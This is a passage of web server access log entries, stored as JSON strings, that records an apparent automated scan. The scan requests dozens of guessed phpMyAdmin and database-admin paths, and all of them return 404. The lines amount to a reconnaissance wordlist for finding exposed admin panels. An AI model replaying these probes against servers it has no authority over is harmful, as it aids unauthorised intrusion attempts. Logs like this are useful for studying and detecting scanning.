      "127.0.0.1 - - [29/Jan/2021:05:55:23 +0000] \"GET /phpMyAdmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:23 +0000] \"GET /phpMyAdmin5/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:24 +0000] \"GET /mysql/admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:25 +0000] \"GET /mysql/dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:25 +0000] \"GET /mysql/sqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:26 +0000] \"GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:26 +0000] \"GET /2phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:27 +0000] \"GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:28 +0000] \"GET /phpmy/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:28 +0000] \"GET /phppma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:29 +0000] \"GET /myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:30 +0000] \"GET /shopdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:30 +0000] \"GET /MyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:31 +0000] \"GET /program/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:32 +0000] \"GET /PMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:32 +0000] \"GET /dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:33 +0000] \"GET /pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:34 +0000] \"GET /db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:34 +0000] \"GET /admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:35 +0000] \"GET /db/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:36 +0000] \"GET /db/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:36 +0000] \"GET /sqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:37 +0000] \"GET /mysqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:38 +0000] \"GET /php-myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:38 +0000] \"GET /phpmy-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:39 +0000] \"GET /mysqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:40 +0000] \"GET /mysql-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:40 +0000] \"GET /admin/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:41 +0000] \"GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:42 +0000] \"GET /admin/sysadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:42 +0000] \"GET /admin/sqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:43 +0000] \"GET /admin/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:44 +0000] \"GET /admin/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:44 +0000] \"GET /admin/pMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:45 +0000] \"GET /mysql/pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:46 +0000] \"GET /mysql/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:46 +0000] \"GET /mysql/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:47 +0000] \"GET /mysql/pMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:48 +0000] \"GET /sql/phpmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:48 +0000] \"GET /sql/php-myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:49 +0000] \"GET /sql/phpmy-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:50 +0000] \"GET /sql/sql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:51 +0000] \"GET /sql/myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:51 +0000] \"GET /sql/webadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:52 +0000] \"GET /sql/sqlweb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:53 +0000] \"GET /sql/websql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:53 +0000] \"GET /sql/webdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:54 +0000] \"GET /sql/sqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:55 +0000] \"GET /sql/sql-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:55 +0000] \"GET /sql/phpmyadmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:56 +0000] \"GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:57 +0000] \"GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:57 +0000] \"GET /db/myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:58 +0000] \"GET /db/webadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:59 +0000] \"GET /db/dbweb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:59 +0000] \"GET /db/websql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:00 +0000] \"GET /db/webdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:01 +0000] \"GET /db/dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:01 +0000] \"GET /db/db-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:02 +0000] \"GET /db/phpmyadmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:03 +0000] \"GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:03 +0000] \"GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:04 +0000] \"GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:04 +0000] \"GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:05 +0000] \"GET /administrator/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:06 +0000] \"GET /administrator/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:06 +0000] \"GET /administrator/pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:07 +0000] \"GET /administrator/PMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:08 +0000] \"GET /administrator/admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:08 +0000] \"GET /phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:09 +0000] \"GET /phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:10 +0000] \"GET /phpMyAdmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:10 +0000] \"GET /phpMyAdmin-3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:11 +0000] \"GET /php-my-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:12 +0000] \"GET /PMA2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:13 +0000] \"GET /PMA2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:13 +0000] \"GET /PMA2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:14 +0000] \"GET /PMA2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:15 +0000] \"GET /PMA2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:15 +0000] \"GET /PMA2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:16 +0000] \"GET /PMA2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:17 +0000] \"GET /PMA2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:18 +0000] \"GET /PMA2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:18 +0000] \"GET /PMA2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:19 +0000] \"GET /pma2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:20 +0000] \"GET /pma2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:20 +0000] \"GET /pma2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:21 +0000] \"GET /pma2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:22 +0000] \"GET /pma2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:22 +0000] \"GET /pma2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:23 +0000] \"GET /pma2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:24 +0000] \"GET /pma2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:24 +0000] \"GET /pma2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:25 +0000] \"GET /pma2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:26 +0000] \"GET /phpmyadmin2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:26 +0000] \"GET /phpmyadmin2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:56:27 +0000] \"GET /phpmyadmin2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
